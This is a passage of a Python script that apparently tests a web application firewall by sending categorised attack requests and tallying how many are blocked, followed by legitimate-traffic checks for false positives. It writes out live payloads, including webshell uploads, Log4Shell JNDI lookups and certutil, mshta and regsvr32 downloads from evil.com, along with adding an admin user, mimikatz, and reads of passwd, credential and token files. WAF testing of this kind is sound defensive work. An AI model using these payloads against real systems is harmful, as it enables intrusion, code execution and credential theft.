send("POST", "/api/data", body='O:8:"Zend_Log":1:{s:7:"storage";O:16:"Zend_Log_Writer":1:{s:4:"path";s:11:"/etc/passwd";}}', category=cat, desc="PHP Zend deserialization")
send("POST", "/api/data", body='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/exploit","autoCommit":true}', headers={"Content-Type": "application/json"}, category=cat, desc="Fastjson gadget")
send("POST", "/api/data", body='_pickle.loads(b"cos\\nsystem\\n(S\'id\'\\ntR.")', category=cat, desc="Python pickle RCE")
send("POST", "/api/data", body="Marshal.load(data)", category=cat, desc="Ruby Marshal")
send("POST", "/api/data", body='node-serialize:{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}', category=cat, desc="Node serialize RCE")
send("POST", "/api/data", body='<java.util.PriorityQueue><comparator class="org.apache.commons.collections.functors.ChainedTransformer">', category=cat, desc="Commons Collections gadget")
print(f"  Deserialization: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 9. FILE UPLOAD ATTACKS (15 tests)
# ═══════════════════════════════════════════════════════════════════════
section("FILE UPLOAD")
cat = "FileUpload"

send("POST", "/upload", body="filename=shell.php&content=<?php system($_GET['cmd']); ?>", category=cat, desc="PHP webshell")
send("POST", "/upload", body="filename=shell.php.jpg&content=<?php system('id'); ?>", category=cat, desc="Double extension")
send("POST", "/upload", body="filename=shell.phtml&content=<?php passthru('id'); ?>", category=cat, desc="phtml shell")
send("POST", "/upload", body="filename=shell.asp&content=<% eval request('cmd') %>", category=cat, desc="ASP webshell")
send("POST", "/upload", body="filename=shell.jsp&content=<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>", category=cat, desc="JSP webshell")
send("POST", "/upload", body="filename=.htaccess&content=AddType application/x-httpd-php .jpg", category=cat, desc=".htaccess upload")
send("POST", "/upload", body="filename=web.config&content=<handlers><add name='php' path='*.jpg' verb='*' modules='CgiModule' scriptProcessor='php-cgi.exe'/></handlers>", category=cat, desc="web.config upload")
send("POST", "/upload", body="filename=shell.php%00.jpg", category=cat, desc="Null byte extension")
send("POST", "/upload", body="filename=shell.PhP", category=cat, desc="Case bypass")
send("POST", "/upload", body='filename=polyglot.php&content=GIF89a<?php system("id");?>', category=cat, desc="GIF polyglot")
send("POST", "/upload", body="filename=shell.php5", category=cat, desc="php5 extension")
send("POST", "/upload", body="filename=shell.phar", category=cat, desc="phar extension")
send("POST", "/upload", body="filename=cmd.exe", category=cat, desc="EXE upload")
send("POST", "/upload", body="filename=shell.war", category=cat, desc="WAR upload")
send("POST", "/upload", body="filename=evil.svg&content=<svg onload=alert(1)>", category=cat, desc="SVG XSS upload")
print(f"  FileUpload: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 10. CRLF / HTTP HEADER INJECTION / SMUGGLING (15 tests)
# ═══════════════════════════════════════════════════════════════════════
section("CRLF / HTTP SMUGGLING")
cat = "CRLF_Smuggling"

send("GET", "/search?q=test%0d%0aSet-Cookie:evil=1", category=cat, desc="CRLF Set-Cookie")
send("GET", "/search?q=test%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK", category=cat, desc="HTTP response split")
send("GET", "/redirect?url=http://example.com%0d%0aInjected-Header:true", category=cat, desc="Header injection")
send("GET", "/search?q=%0d%0aLocation:%20http://evil.com", category=cat, desc="CRLF redirect")
send("POST", "/api", body="test", headers={"Transfer-Encoding": "chunked, identity"}, category=cat, desc="TE smuggling")
send("POST", "/api", body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n", headers={"Transfer-Encoding": "chunked"}, category=cat, desc="Chunked smuggling")
send("GET", "/search?q=test%0d%0aX-Forwarded-For: 127.0.0.1", category=cat, desc="CRLF X-Forwarded-For")
send("GET", "/search?q=%0aHost:%20evil.com", category=cat, desc="Host header injection")
send("POST", "/api", body="test", headers={"Content-Length": "0", "Transfer-Encoding": "chunked"}, category=cat, desc="CL.TE smuggling")
send("POST", "/api", body="test", headers={"X-Http-Method-Override": "DELETE"}, category=cat, desc="Method override")
send("GET", "/search?q=test%0d%0aAccess-Control-Allow-Origin:%20*", category=cat, desc="CRLF CORS inject")
send("GET", "/search?q=test%0d%0a%0d%0a<script>alert(1)</script>", category=cat, desc="CRLF + XSS")
send("POST", "/api", body="", headers={"Content-Type": "text/plain\r\nX-Injected: true"}, category=cat, desc="Header value injection")
send("GET", "/search?q=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>evil</html>", category=cat, desc="Full response injection")
send("GET", "/search?q=%E5%98%8A%E5%98%8DSet-Cookie:evil=1", category=cat, desc="Unicode CRLF %E5%98%8A%E5%98%8D")
print(f"  CRLF/Smuggling: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 11. LDAP INJECTION (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("LDAP INJECTION")
cat = "LDAP"

send("GET", "/search?user=*)(uid=*))(|(uid=*", category=cat, desc="LDAP wildcard")
send("GET", "/search?user=admin)(&)", category=cat, desc="LDAP AND bypass")
send("GET", "/search?user=*)(objectClass=*", category=cat, desc="LDAP objectClass")
send("GET", "/search?user=admin)(|(password=*))", category=cat, desc="LDAP password dump")
send("GET", "/search?user=)(cn=*))%00", category=cat, desc="LDAP null byte")
send("GET", "/search?user=*)(userPassword=*", category=cat, desc="LDAP userPassword")
send("GET", "/search?user=admin)(!(&(1=0))", category=cat, desc="LDAP NOT bypass")
send("GET", "/search?user=)(memberOf=CN=Admins*", category=cat, desc="LDAP group enum")
send("GET", "/search?user=*)(sAMAccountName=*", category=cat, desc="LDAP AD sAMAccountName")
send("GET", "/search?user=admin)(|(mail=*))", category=cat, desc="LDAP mail dump")
print(f"  LDAP: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 12. XPATH INJECTION (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("XPATH INJECTION")
cat = "XPath"

send("GET", "/search?q=' or '1'='1", category=cat, desc="XPath OR bypass")
send("GET", "/search?q='] | //user | //a['", category=cat, desc="XPath UNION")
send("GET", "/search?q=string-length(name(/*[1]))>0", category=cat, desc="XPath string-length")
send("GET", "/search?q=') or count(//user)>0 or ('1'='1", category=cat, desc="XPath count")
send("GET", "/search?q='] | //password | //*['", category=cat, desc="XPath password dump")
send("GET", "/search?q=substring(//user[1]/password,1,1)='a", category=cat, desc="XPath blind substring")
send("GET", "/search?q=name(/*[1])", category=cat, desc="XPath root name")
send("GET", "/search?q=//*[contains(.,password)]", category=cat, desc="XPath contains")
send("GET", "/search?q=//user[position()=1]", category=cat, desc="XPath position")
send("GET", "/search?q=/*/*/*/text()", category=cat, desc="XPath text extraction")
print(f"  XPath: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 13. GRAPHQL ATTACKS (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("GRAPHQL ATTACKS")
cat = "GraphQL"

send("POST", "/graphql", body='{"query":"{__schema{types{name}}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="Schema introspection")
send("POST", "/graphql", body='{"query":"{__type(name:\\"User\\"){fields{name}}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="Type introspection")
send("POST", "/graphql", body='{"query":"query{users{id password email}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="Sensitive field query")
send("POST", "/graphql", body='{"query":"mutation{deleteAllUsers{count}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="Destructive mutation")
send("POST", "/graphql", body='{"query":"{a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename}"}', headers={"Content-Type": "application/json"}, category=cat, desc="Query batching DoS")
send("POST", "/graphql", body='{"query":"query{user(id:\\"1 OR 1=1--\\"){name}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="GraphQL SQLi")
send("POST", "/graphql", body='{"query":"query{user(id:\\"1\\"){name friends{name friends{name friends{name}}}}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="Nested query DoS")
send("POST", "/graphql", body='{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name}}}","operationName":null}', headers={"Content-Type": "application/json"}, category=cat, desc="Full schema dump")
send("POST", "/graphql", body='{"query":"query IntrospectionQuery{__schema{queryType{name}types{name kind description fields(includeDeprecated:true){name}}}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="IntrospectionQuery")
send("POST", "/graphql", body='{"query":"{admin{secretKey apiToken internalEndpoint}}"}', headers={"Content-Type": "application/json"}, category=cat, desc="Sensitive admin fields")
print(f"  GraphQL: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 14. CVE-SPECIFIC ATTACKS (20 tests)
# ═══════════════════════════════════════════════════════════════════════
section("CVE-SPECIFIC ATTACKS")
cat = "CVE"

send("GET", "/search?q=${jndi:ldap://evil.com/exploit}", category=cat, desc="Log4Shell CVE-2021-44228")
send("GET", "/search?q=${jndi:rmi://evil.com/exploit}", category=cat, desc="Log4Shell RMI")
send("GET", "/search?q=${${lower:j}ndi:${lower:l}dap://evil.com/x}", category=cat, desc="Log4Shell obfuscated")
send("POST", "/api", body="class.module.classLoader.URLs[0]=http://evil.com", category=cat, desc="Spring4Shell CVE-2022-22965")
send("GET", "/%24%7B%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%7D", category=cat, desc="Struts2 OGNL")
send("GET", "/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd", category=cat, desc="Apache path traversal CVE-2021-41773")
send("POST", "/api", body='{"username":"admin","password":"admin","__class__":{"__init__":{"__globals__":{"sys":{"modules":{"os":{"system":"id"}}}}}}}', headers={"Content-Type": "application/json"}, category=cat, desc="Python class injection")
send("GET", "/wp-content/plugins/revslider/temp/update_extract/revslider/shell.php", category=cat, desc="RevSlider exploit")
send("GET", "/autodiscover/autodiscover.json?@zdi/PowerShell", category=cat, desc="ProxyShell CVE-2021-34473")
send("POST", "/api", body="<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body><web:ServerCustomAction xmlns:web='weblogic.wsee.jms'><arg0><cmd>cat /etc/passwd</cmd></arg0></web:ServerCustomAction></soapenv:Body></soapenv:Envelope>", headers={"Content-Type": "text/xml"}, category=cat, desc="WebLogic SOAP exploit")
send("GET", "/confluence/rest/api/content/%2F;/admin", category=cat, desc="Confluence auth bypass")
send("GET", "/api/v4/projects/1/repository/archive.tar.gz?sha=--exec=id", category=cat, desc="GitLab CE RCE")
send("GET", "/public/plugins/grafana-clock-panel/../../../../../etc/passwd", category=cat, desc="Grafana LFI CVE-2021-43798")
send("GET", "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", category=cat, desc="F5 BIG-IP CVE-2020-5902")
send("GET", "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", category=cat, desc="FortiOS CVE-2018-13379")
send("GET", "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application", category=cat, desc="Exchange ProxyLogon")
send("POST", "/api/jsonws/invoke", body='{"cmd": "/bin/sh -c id"}', headers={"Content-Type": "application/json"}, category=cat, desc="Liferay RCE")
send("GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", category=cat, desc="PHPUnit RCE CVE-2017-9841")
send("GET", "/solr/admin/cores?action=STATUS&wt=json", category=cat, desc="Solr admin access")
send("GET", "/.env", category=cat, desc="Laravel .env exposure")
print(f"  CVE: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 15. WAF BYPASS / EVASION TECHNIQUES (20 tests)
# ═══════════════════════════════════════════════════════════════════════
section("WAF BYPASS / EVASION")
cat = "WAF_Bypass"

send("GET", "/search?q=%253Cscript%253Ealert(1)%253C/script%253E", category=cat, desc="Double URL encode XSS")
send("GET", "/search?q=%27%20%4F%52%20%31%3D%31%2D%2D", category=cat, desc="Hex encoded SQLi")
send("GET", "/search?q=<scr%00ipt>alert(1)</scr%00ipt>", category=cat, desc="Null byte in tag")
send("GET", "/search?q=sElEcT%09UsEr()%09FrOm%09DuAl", category=cat, desc="Mixed case + tab")
send("GET", "/search?q=1'%0bOR%0b1=1--", category=cat, desc="Vertical tab evasion")
send("GET", "/search?q=1'+/*!50000OR*/+1=1--", category=cat, desc="MySQL version comment")
send("GET", "/search?q=1'/**/union/**/select/**/1,2,3--", category=cat, desc="Comment bypass UNION")
send("GET", "/search?q=<img/src=x/onerror=alert(1)>", category=cat, desc="Slash instead of space")
send("GET", "/search?q=%c0%27+OR+1=1--", category=cat, desc="Overlong UTF-8 quote")
send("POST", "/search", body="q=<script>alert(1)</script>", headers={"Content-Type": "application/x-www-form-urlencoded", "Transfer-Encoding": "chunked"}, category=cat, desc="Chunked body XSS")
send("GET", "/search?q=concat(char(60),char(115),char(99),char(114),char(105),char(112),char(116),char(62))", category=cat, desc="CHAR() XSS")
send("GET", "/search?q=1'||'1'='1", category=cat, desc="Concat OR bypass")
send("POST", "/api", body='{"query":"<script>alert(1)</script>"}', headers={"Content-Type": "application/json"}, category=cat, desc="JSON body XSS")
send("GET", "/search?q=%ef%bc%87%20OR%201=1--", category=cat, desc="Unicode fullwidth quote")
send("GET", "/search?q=1' OR 1=1-- -", category=cat, desc="MySQL comment dash-space-dash")
send("POST", "/api", body="<![CDATA[<script>alert(1)</script>]]>", headers={"Content-Type": "text/xml"}, category=cat, desc="CDATA XSS")
send("GET", "/search?q=convert(int,(select+user+from+sysusers))", category=cat, desc="MSSQL convert injection")
send("GET", "/search?q=';exec+master..xp_cmdshell+'whoami'--", category=cat, desc="MSSQL xp_cmdshell")
send("GET", "/search?q=1%27%20UNION%20SELECT%20%40%40version--", category=cat, desc="URL encoded UNION @@version")
send("GET", "/search?q=<ScRiPt%20>alert%281%29<%2fScRiPt>", category=cat, desc="Mixed encoding XSS")
print(f"  WAF Bypass: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 16. OPEN REDIRECT (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("OPEN REDIRECT")
cat = "OpenRedirect"

send("GET", "/redirect?url=http://evil.com", category=cat, desc="Direct redirect")
send("GET", "/redirect?url=//evil.com", category=cat, desc="Protocol-relative")
send("GET", "/redirect?url=http://evil.com%00@good.com", category=cat, desc="Null byte @ bypass")
send("GET", "/redirect?url=http://good.com@evil.com", category=cat, desc="@ bypass")
send("GET", "/redirect?url=http://evil.com%2F%2F@good.com", category=cat, desc="Encoded slash bypass")
send("GET", "/redirect?url=https://evil.com/good.com", category=cat, desc="Path confusion")
send("GET", "/redirect?url=javascript:alert(1)", category=cat, desc="JavaScript redirect")
send("GET", "/redirect?url=data:text/html,<script>alert(1)</script>", category=cat, desc="Data URI redirect")
send("GET", "/login?next=http://evil.com", category=cat, desc="Login next redirect")
send("GET", "/redirect?url=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d", category=cat, desc="Encoded evil URL")
print(f"  OpenRedirect: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 17. SCANNER / RECON DETECTION (15 tests)
# ═══════════════════════════════════════════════════════════════════════
section("SCANNER / RECON DETECTION")
cat = "Scanner"

send("GET", "/.git/HEAD", category=cat, desc="Git HEAD")
send("GET", "/.git/config", category=cat, desc="Git config")
send("GET", "/.svn/entries", category=cat, desc="SVN entries")
send("GET", "/.DS_Store", category=cat, desc="DS_Store")
send("GET", "/wp-login.php", category=cat, desc="WordPress login")
send("GET", "/wp-admin/", category=cat, desc="WordPress admin")
send("GET", "/administrator/", category=cat, desc="Joomla admin")
send("GET", "/phpmyadmin/", category=cat, desc="phpMyAdmin")
send("GET", "/actuator/env", category=cat, desc="Spring actuator env")
send("GET", "/actuator/health", category=cat, desc="Spring actuator health")
send("GET", "/server-status", category=cat, desc="Apache server-status")
send("GET", "/server-info", category=cat, desc="Apache server-info")
send("GET", "/debug/pprof/", category=cat, desc="Go pprof")
send("GET", "/elmah.axd", category=cat, desc="ELMAH error log")
send("GET", "/console", headers={"User-Agent": "sqlmap/1.5"}, category=cat, desc="SQLmap user-agent")
print(f"  Scanner: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 18. AUTHENTICATION / JWT / SESSION ATTACKS (15 tests)
# ═══════════════════════════════════════════════════════════════════════
section("AUTH / JWT / SESSION")
cat = "Auth"

send("GET", "/api/admin", headers={"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0."}, category=cat, desc="JWT alg:none")
send("POST", "/api/login", body='{"password":{"$regex":".*"}}', headers={"Content-Type": "application/json"}, category=cat, desc="Regex password bypass")
send("GET", "/api/admin?role=admin", category=cat, desc="Parameter role escalation")
send("POST", "/api/user", body='{"role":"admin","isAdmin":true}', headers={"Content-Type": "application/json"}, category=cat, desc="Mass assignment admin")
send("GET", "/api/users/1?fields=password,secret_key,api_token", category=cat, desc="Sensitive field request")
send("GET", "/admin/user/1", headers={"X-Original-URL": "/admin/user/1"}, category=cat, desc="X-Original-URL bypass")
send("GET", "/api/resource", headers={"X-Forwarded-For": "127.0.0.1"}, category=cat, desc="IP spoof X-Forwarded-For")
send("GET", "/api/resource", headers={"X-Real-IP": "127.0.0.1", "X-Forwarded-Host": "internal.local"}, category=cat, desc="X-Real-IP + X-Forwarded-Host")
send("POST", "/api/reset-password", body="email=admin@company.com&new_password=hacked", category=cat, desc="Password reset abuse")
send("GET", "/api/token?grant_type=client_credentials&client_id=admin&client_secret=test", category=cat, desc="OAuth credential theft")
send("POST", "/api/login", body='{"username":"admin","password":"admin"}', headers={"Content-Type": "application/json"}, category=cat, desc="Default credentials")
send("POST", "/api/login", body='{"username":"admin","password":"password123"}', headers={"Content-Type": "application/json"}, category=cat, desc="Weak password")
send("POST", "/api/login", body='{"username":"root","password":"toor"}', headers={"Content-Type": "application/json"}, category=cat, desc="Root default creds")
send("GET", "/api/debug/session", category=cat, desc="Session debug endpoint")
send("POST", "/api/auth", body='{"token":"null","admin":true}', headers={"Content-Type": "application/json"}, category=cat, desc="Null token with admin")
print(f"  Auth/JWT: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 19. CLOUD / CONTAINER / INFRASTRUCTURE (15 tests)
# ═══════════════════════════════════════════════════════════════════════
section("CLOUD / CONTAINER / INFRA")
cat = "Cloud"

send("GET", "/latest/meta-data/iam/security-credentials/", category=cat, desc="AWS metadata direct")
send("GET", "/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role", category=cat, desc="AWS IAM role SSRF")
send("GET", "/api?cmd=kubectl get secrets", category=cat, desc="kubectl get secrets")
send("GET", "/api?cmd=docker exec -it container /bin/bash", category=cat, desc="Docker exec bash")
send("GET", "/search?q=AWS_SECRET_ACCESS_KEY=AKIA", category=cat, desc="AWS key in query")
send("POST", "/api", body='{"aws_access_key_id":"AKIAIOSFODNN7EXAMPLE","aws_secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}', headers={"Content-Type": "application/json"}, category=cat, desc="AWS creds in body")
send("GET", "/api?cmd=terraform state pull", category=cat, desc="Terraform state")
send("GET", "/api?cmd=vault secrets list", category=cat, desc="Vault secrets")
send("GET", "/api?cmd=helm list --all-namespaces", category=cat, desc="Helm list")
send("GET", "/.docker/config.json", category=cat, desc="Docker config")
send("GET", "/var/run/secrets/kubernetes.io/serviceaccount/token", category=cat, desc="K8s service account")
send("GET", "/api?cmd=az account list", category=cat, desc="Azure CLI")
send("GET", "/api?cmd=gcloud auth print-access-token", category=cat, desc="GCloud auth token")
send("GET", "/api?cmd=aws sts get-caller-identity", category=cat, desc="AWS STS identity")
send("GET", "/api?cmd=eksctl get cluster", category=cat, desc="EKS cluster info")
print(f"  Cloud/Container: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 20. BUSINESS LOGIC / IDOR / PRIVILEGE ESCALATION (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("BUSINESS LOGIC / IDOR")
cat = "BusinessLogic"

send("GET", "/api/users/0", category=cat, desc="IDOR user ID 0")
send("GET", "/api/order/-1", category=cat, desc="Negative ID")
send("POST", "/api/transfer", body='{"amount":-1000,"to":"attacker"}', headers={"Content-Type": "application/json"}, category=cat, desc="Negative transfer amount")
send("POST", "/api/coupon", body='{"code":"DISCOUNT","quantity":999999}', headers={"Content-Type": "application/json"}, category=cat, desc="Coupon quantity abuse")
send("PUT", "/api/users/1", body='{"role":"admin","is_superuser":true}', headers={"Content-Type": "application/json"}, category=cat, desc="Privilege escalation PUT")
send("DELETE", "/api/users/1", category=cat, desc="Delete other user")
send("GET", "/api/export?format=csv&table=users", category=cat, desc="Data export abuse")
send("POST", "/api/password-reset", body='{"user_id":1,"new_password":"hacked123"}', headers={"Content-Type": "application/json"}, category=cat, desc="Direct password reset")
send("GET", "/api/admin/users?limit=99999", category=cat, desc="Excessive data request")
send("POST", "/api/admin/config", body='{"debug":true,"allow_all":true}', headers={"Content-Type": "application/json"}, category=cat, desc="Config manipulation")
print(f"  BusinessLogic: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 21. WORDPRESS / CMS SPECIFIC (15 tests)
# ═══════════════════════════════════════════════════════════════════════
section("WORDPRESS / CMS")
cat = "CMS"

send("GET", "/wp-content/uploads/2024/shell.php", category=cat, desc="WP uploaded shell")
send("POST", "/xmlrpc.php", body='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName></methodCall>', headers={"Content-Type": "text/xml"}, category=cat, desc="XMLRPC multicall brute")
send("GET", "/wp-json/wp/v2/users", category=cat, desc="WP REST user enum")
send("GET", "/wp-content/debug.log", category=cat, desc="WP debug log")
send("POST", "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../wp-config.php", category=cat, desc="RevSlider LFI")
send("GET", "/?author=1", category=cat, desc="WP author enum")
send("GET", "/wp-includes/wlwmanifest.xml", category=cat, desc="WP WLW manifest")
send("POST", "/wp-login.php", body="log=admin&pwd=password&wp-submit=Log+In", category=cat, desc="WP brute force")
send("GET", "/wp-content/plugins/wp-file-manager/readme.txt", category=cat, desc="WP File Manager vuln check")
send("GET", "/administrator/index.php", category=cat, desc="Joomla admin panel")
send("GET", "/sites/default/files/.htaccess", category=cat, desc="Drupal htaccess")
send("GET", "/user/register", category=cat, desc="Drupal user registration")
send("GET", "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,1,1)", category=cat, desc="Joomla com_fields SQLi")
send("GET", "/skin/adminhtml/default/default/css/styles.css", category=cat, desc="Magento admin detection")
send("GET", "/downloader/", category=cat, desc="Magento downloader")
print(f"  CMS: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 22. PHP-SPECIFIC ATTACKS (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("PHP-SPECIFIC")
cat = "PHP"

send("GET", "/search?q=<?php system('id'); ?>", category=cat, desc="PHP tag injection")
send("GET", "/search?q=<?=`id`?>", category=cat, desc="PHP short tag backtick")
send("POST", "/api", body="data=a]>O:8:'stdClass':0:{}", category=cat, desc="PHP unserialize")
send("GET", "/search?q=php://filter/read=convert.base64-encode/resource=index", category=cat, desc="PHP filter chain")
send("GET", "/index.php?page=php://input", category=cat, desc="PHP input stream")
send("GET", "/index.php?page=expect://whoami", category=cat, desc="PHP expect")
send("POST", "/api", body="data=passthru('id')", category=cat, desc="PHP passthru")
send("POST", "/api", body="data=eval(base64_decode('c3lzdGVtKCdpZCcp'))", category=cat, desc="PHP eval base64")
send("POST", "/api", body='data=preg_replace("/test/e","system(\'id\')","test")', category=cat, desc="PHP preg_replace /e")
send("GET", "/search?q=assert(phpinfo())", category=cat, desc="PHP assert")
print(f"  PHP: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 23. JAVA / LOG4J / SPRING (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("JAVA / LOG4J / SPRING")
cat = "Java"

send("GET", "/search?q=${jndi:ldap://evil.com/a}", category=cat, desc="Log4j basic")
send("GET", "/search", headers={"X-Api-Version": "${jndi:ldap://evil.com/a}"}, category=cat, desc="Log4j in header")
send("GET", "/search", headers={"User-Agent": "${jndi:dns://evil.com}"}, category=cat, desc="Log4j in UA")
send("POST", "/api", body='class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di', category=cat, desc="Spring4Shell payload")
send("GET", "/search?q=${T(java.lang.Runtime).getRuntime().exec('id')}", category=cat, desc="SpEL injection")
send("GET", '/search?q=%23{T(java.lang.Runtime).getRuntime().exec("id")}', category=cat, desc="SpEL # variant")
send("GET", "/search?q=%25{(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)}", category=cat, desc="OGNL injection")
send("GET", "/search?q=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','id'}).start()", category=cat, desc="ProcessBuilder")
send("GET", "/jolokia/exec/java.lang:type=Runtime/exec(java.lang.String)/id", category=cat, desc="Jolokia RCE")
send("GET", "/actuator/gateway/routes", category=cat, desc="Spring Gateway routes")
print(f"  Java/Log4j: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 24. WINDOWS-SPECIFIC ATTACKS (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("WINDOWS-SPECIFIC")
cat = "Windows"

send("GET", "/search?q=;powershell -enc JABjAGwA", category=cat, desc="PowerShell encoded")
send("GET", "/search?q=;cmd /c whoami", category=cat, desc="cmd /c")
send("GET", "/search?q=;certutil -urlcache -split -f http://evil.com/shell.exe", category=cat, desc="Certutil download")
send("GET", "/search?q=;bitsadmin /transfer job http://evil.com/shell.exe c:\\temp\\shell.exe", category=cat, desc="BITSAdmin")
send("GET", "/search?q=;mshta http://evil.com/evil.hta", category=cat, desc="MSHTA execution")
send("GET", "/search?q=;regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll", category=cat, desc="Regsvr32 SCT")
send("GET", "/search?q=;wmic process call create 'cmd /c whoami'", category=cat, desc="WMIC process")
send("GET", "/search?q=;net user hacker P@ssw0rd /add", category=cat, desc="Net user add")
send("GET", "/search?q=;net localgroup administrators hacker /add", category=cat, desc="Add to admins")
send("GET", "/search?q=;mimikatz.exe privilege::debug sekurlsa::logonpasswords", category=cat, desc="Mimikatz")
print(f"  Windows: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 25. SENSITIVE FILE / ENDPOINT ACCESS (10 tests)
# ═══════════════════════════════════════════════════════════════════════
section("SENSITIVE FILES / ENDPOINTS")
cat = "SensitiveFiles"

send("GET", "/.env", category=cat, desc="Environment file")
send("GET", "/config.yml", category=cat, desc="Config YAML")
send("GET", "/database.yml", category=cat, desc="Database config")
send("GET", "/web.config", category=cat, desc="IIS web.config")
send("GET", "/WEB-INF/web.xml", category=cat, desc="Java WEB-INF")
send("GET", "/crossdomain.xml", category=cat, desc="Flash crossdomain")
send("GET", "/.htpasswd", category=cat, desc="htpasswd file")
send("GET", "/backup.sql", category=cat, desc="SQL backup")
send("GET", "/dump.sql", category=cat, desc="SQL dump")
send("GET", "/id_rsa", category=cat, desc="SSH private key")
print(f"  SensitiveFiles: {stats[cat]['blocked']}/{stats[cat]['total']} blocked")


# ═══════════════════════════════════════════════════════════════════════
# 26. FALSE POSITIVE TESTS - LEGITIMATE TRAFFIC (30 tests)
# ═══════════════════════════════════════════════════════════════════════
section("FALSE POSITIVE TESTS (Legitimate Traffic)")
cat = "FP_Legitimate"

# Health and status endpoints
send("GET", "/health", category=cat, expect_block=False, desc="Health check")
send("GET", "/metrics", category=cat, expect_block=False, desc="Metrics endpoint")

# Normal search queries
send("GET", "/search?q=python+programming+tutorial", category=cat, expect_block=False, desc="Normal search: programming")
send("GET", "/search?q=best+restaurants+near+me", category=cat, expect_block=False, desc="Normal search: restaurants")
send("GET", "/search?q=how+to+bake+a+cake", category=cat, expect_block=False, desc="Normal search: baking")
send("GET", "/search?q=machine+learning+course", category=cat, expect_block=False, desc="Normal search: ML course")
send("GET", "/search?q=weather+forecast+today", category=cat, expect_block=False, desc="Normal search: weather")
send("GET", "/search?q=new+york+times", category=cat, expect_block=False, desc="Normal search: NYT")
send("GET", "/search?q=iphone+15+review", category=cat, expect_block=False, desc="Normal search: iPhone review")
send("GET", "/search?q=world+cup+2026+schedule", category=cat, expect_block=False, desc="Normal search: world cup")

# Normal POST requests
send("POST", "/api/contact", body='{"name":"John Doe","email":"john@example.com","message":"Hello, I have a question about your product."}', headers={"Content-Type": "application/json"}, category=cat, expect_block=False, desc="Contact form")
send("POST", "/api/feedback", body='{"rating":5,"comment":"Great service, very helpful!"}', headers={"Content-Type": "application/json"}, category=cat, expect_block=False, desc="Feedback form")
send("POST", "/api/newsletter", body='{"email":"user@gmail.com"}', headers={"Content-Type": "application/json"}, category=cat, expect_block=False, desc="Newsletter signup")

# Normal API usage
send("GET", "/api/products?page=1&limit=20&sort=price", category=cat, expect_block=False, desc="Product listing")
